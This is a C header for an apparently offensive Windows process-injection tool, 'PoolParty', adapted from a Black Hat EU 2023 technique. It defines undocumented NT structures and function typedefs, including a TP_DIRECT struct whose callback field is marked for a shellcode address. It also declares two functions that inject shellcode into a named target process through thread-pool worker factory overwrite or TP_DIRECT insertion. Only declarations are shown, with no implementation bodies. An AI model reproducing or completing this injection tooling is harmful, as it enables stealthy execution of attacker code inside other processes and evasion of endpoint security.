#pragma once
/*
 *  PoolParty — Thread Pool Process Injection
 *  Techniques adapted from @_0xDeku (Black Hat EU 2023)
 *  https://github.com/SafeBreach-Labs/PoolParty
 *
 *  Variant 1 : WorkerFactory start-routine overwrite  (wf_overwrite)
 *  Variant 7 : TP_DIRECT insertion via IoCompletion   (tp_direct)
 */

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

/* ── NT status helpers ────────────────────────────────────────────────── */
#ifndef STATUS_INFO_LENGTH_MISMATCH
#  define STATUS_INFO_LENGTH_MISMATCH  0xC0000004UL
#endif
#ifndef STATUS_BUFFER_TOO_SMALL
#  define STATUS_BUFFER_TOO_SMALL      0xC0000023UL
#endif

/* ── NtQueryObject information class ─────────────────────────────────── */
#define PP_ObjectTypeInformation       2

/* ── NtQueryInformationProcess class for handle snapshot (Win8+) ─────── */
#define PP_ProcessHandleInformation    51

/* ── Worker-factory access mask ──────────────────────────────────────── */
#ifndef WORKER_FACTORY_ALL_ACCESS
#  define WORKER_FACTORY_ALL_ACCESS    0x001F003FL
#endif

/* ── I/O completion access mask ──────────────────────────────────────── */
#ifndef IO_COMPLETION_ALL_ACCESS
#  define IO_COMPLETION_ALL_ACCESS     0x001F0003L
#endif

/* ── Handle snapshot structs ─────────────────────────────────────────── */
typedef struct _PP_HANDLE_ENTRY {
    HANDLE      HandleValue;
    ULONG_PTR   HandleCount;
    ULONG_PTR   PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG       ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} PP_HANDLE_ENTRY, *PPP_HANDLE_ENTRY;

typedef struct _PP_HANDLE_SNAPSHOT {
    ULONG_PTR       NumberOfHandles;
    ULONG_PTR       Reserved;
    PP_HANDLE_ENTRY Handles[ANYSIZE_ARRAY];
} PP_HANDLE_SNAPSHOT, *PPP_HANDLE_SNAPSHOT;

/* ── NtQueryObject result (ObjectTypeInformation) ────────────────────── */
typedef struct _PP_OBJECT_TYPE_INFO {
    UNICODE_STRING TypeName;
    ULONG          Reserved[22];
} PP_OBJECT_TYPE_INFO, *PPP_OBJECT_TYPE_INFO;

/* ── WorkerFactory basic information ─────────────────────────────────── */
typedef enum _PP_QUERY_WF_CLASS {
    PPWorkerFactoryBasicInformation = 7
} PP_QUERY_WF_CLASS;

typedef enum _PP_SET_WF_CLASS {
    PPWorkerFactoryThreadMinimum = 4
} PP_SET_WF_CLASS;

typedef struct _PP_WF_BASIC_INFO {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN       Paused;
    BOOLEAN       TimerSet;
    BOOLEAN       QueuedToExWorker;
    BOOLEAN       MayCreate;
    BOOLEAN       CreateInProgress;
    BOOLEAN       InsertedIntoQueue;
    BOOLEAN       Shutdown;
    ULONG         BindingCount;
    ULONG         ThreadMinimum;
    ULONG         ThreadMaximum;
    ULONG         PendingWorkerCount;
    ULONG         WaitingWorkerCount;
    ULONG         TotalWorkerCount;
    ULONG         ReleaseCount;
    LONGLONG      InfiniteWaitGoal;
    PVOID         StartRoutine;
    PVOID         StartParameter;
    HANDLE        ProcessId;
    SIZE_T        StackReserve;
    SIZE_T        StackCommit;
    NTSTATUS      LastThreadCreationStatus;
} PP_WF_BASIC_INFO, *PPP_WF_BASIC_INFO;

/* ── Undocumented TP_DIRECT kernel structure ──────────────────────────── */
typedef struct _PP_TP_TASK_CALLBACKS {
    PVOID ExecuteCallback;
    PVOID Unposted;
} PP_TP_TASK_CALLBACKS, *PPP_TP_TASK_CALLBACKS;

typedef struct _PP_TP_TASK {
    PPP_TP_TASK_CALLBACKS Callbacks;
    UINT32                NumaNode;
    UINT8                 IdealProcessor;
    BYTE                  Padding[3];
    LIST_ENTRY            ListEntry;
} PP_TP_TASK, *PPP_TP_TASK;

typedef struct _PP_TP_DIRECT {
    PP_TP_TASK Task;
    UINT64     Lock;
    LIST_ENTRY IoCompletionInformationList;
    PVOID      Callback;        /* <── shellcode address goes here */
    UINT32     NumaNode;
    UINT8      IdealProcessor;
    BYTE       __PADDING__[3];
} PP_TP_DIRECT, *PPP_TP_DIRECT;

/* ── NT function pointer typedefs ────────────────────────────────────── */
typedef NTSTATUS (NTAPI *fnNtQueryInformationProcess)(
    HANDLE  ProcessHandle,
    ULONG   ProcessInformationClass,
    PVOID   ProcessInformation,
    ULONG   ProcessInformationLength,
    PULONG  ReturnLength);

typedef NTSTATUS (NTAPI *fnNtQueryObject)(
    HANDLE  Handle,
    ULONG   ObjectInformationClass,
    PVOID   ObjectInformation,
    ULONG   ObjectInformationLength,
    PULONG  ReturnLength);

typedef NTSTATUS (NTAPI *fnNtQueryInformationWorkerFactory)(
    HANDLE  WorkerFactoryHandle,
    ULONG   WorkerFactoryInformationClass,
    PVOID   WorkerFactoryInformation,
    ULONG   WorkerFactoryInformationLength,
    PULONG  ReturnLength);

typedef NTSTATUS (NTAPI *fnNtSetInformationWorkerFactory)(
    HANDLE  WorkerFactoryHandle,
    ULONG   WorkerFactoryInformationClass,
    PVOID   WorkerFactoryInformation,
    ULONG   WorkerFactoryInformationLength);

typedef NTSTATUS (NTAPI *fnZwSetIoCompletion)(
    HANDLE    IoCompletionHandle,
    PVOID     KeyContext,
    PVOID     ApcContext,
    NTSTATUS  IoStatus,
    ULONG_PTR IoStatusInformation);

/* ── Public injection functions ──────────────────────────────────────── */
BOOL PoolPartyTpDirect   (IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, IN LPCSTR szTarget);
BOOL PoolPartyWfOverwrite(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, IN LPCSTR szTarget);
